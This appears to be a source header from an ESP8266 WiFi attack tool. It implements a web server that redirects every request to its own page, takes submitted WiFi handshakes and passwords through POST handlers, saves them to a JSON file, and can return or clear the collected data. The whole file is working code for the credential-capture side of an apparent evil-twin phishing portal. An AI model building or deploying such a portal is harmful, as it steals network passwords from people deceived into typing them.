#pragma once

#include <LittleFS.h>
#include <ESP8266WebServer.h>
#include "utils.h"

extern void handleRequest(ESP8266WebServer& server,String fileName,String ext);
extern void handleNotFound(ESP8266WebServer& server);
extern void handlePostHandshake(ESP8266WebServer& server);
extern void handlePostPassword(ESP8266WebServer& server);

extern String getDatas();
extern String clearHandshakes();
extern String clearPasswords();

void handleRequest(ESP8266WebServer& server,String fileName,String ext) {
    File files = LittleFS.open("/"+ext+fileName, "r");
    if (files) {
        if(ext=="js"){
            ext = "javascript";
          }
        server.streamFile(files, "text/"+ext);
        files.close();
    }
    else {
        server.send(404, "text/plain", "File not found");
    }
}

void handleNotFound(ESP8266WebServer& server) {
    server.sendHeader("Location", "/");
    server.send(302, "text/html", "");
}

void handlePostHandshake(ESP8266WebServer& server) {
    String handshake = server.arg("plain");
    if (handshake == "") {
        server.send(200,"application/json","{\"message\":\"Handshake is empty.\"}");
        return;
    }
    DynamicJsonDocument handshakeJson = readJsonFile("/json/datas.json");
    JsonArray handshakes = handshakeJson["handshakes"];
    handshakes.add(handshake);
    writeJsonFile("/json/datas.json", handshakeJson);
    server.send(200,"application/json","{\"message\":\"Handshake added.\"}"); 
}

void handlePostPassword(ESP8266WebServer& server) {
    String password = server.arg("plain");
    if (password == "") {
        server.send(200,"application/json","{\"message\":\"Password is empty.\"}");
        return;
    }
    DynamicJsonDocument handshakeJson = readJsonFile("/json/datas.json");
    JsonArray handshakes = handshakeJson["passwords"];
    handshakes.add(password);
    writeJsonFile("/json/datas.json", handshakeJson);
    server.send(200,"application/json","{\"message\":\"Password added.\"}"); 
}

String getDatas() {
    File file = LittleFS.open("/json/datas.json", "r");
    String jsonString = file.readString();
    file.close();
    
    jsonString.replace("\\\"", "\"");
    jsonString.replace("\"{", "{");
    jsonString.replace("}\"", "}");
    return jsonString;
}

String clearHandshakes() {
    DynamicJsonDocument handshakeJson = readJsonFile("/json/datas.json");
    JsonArray handshakes = handshakeJson["handshakes"];
    handshakes.clear();
    writeJsonFile("/json/datas.json", handshakeJson);
    return "{\"message\":\"Handshakes cleared.\"}";
} 

String clearPasswords() {
    DynamicJsonDocument handshakeJson = readJsonFile("/json/datas.json");
    JsonArray handshakes = handshakeJson["passwords"];
    handshakes.clear();
    writeJsonFile("/json/datas.json", handshakeJson);
    return "{\"message\":\"Passwords cleared.\"}";
}